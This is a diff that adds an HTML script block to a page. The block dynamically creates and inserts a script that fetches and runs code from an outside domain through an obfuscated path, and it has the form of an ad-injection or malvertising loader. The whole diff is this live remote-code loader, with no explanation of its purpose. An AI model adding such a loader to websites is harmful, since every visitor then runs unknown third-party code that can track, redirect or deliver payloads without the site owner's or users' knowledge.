@@ -1,0 +1,12 @@
+<script>
+(function(qvjpx){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = qvjpx || {};
+s.src = "\/\/thankfuldirection.com\/bEX.VqsBdSGZl\/0BYcWKcS\/AeSmA9vu\/Z-UUlhkQPETKYj3\/NLDbQWx\/NWDqMXtINkjhct0KN\/DfEA0\/N\/Av";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
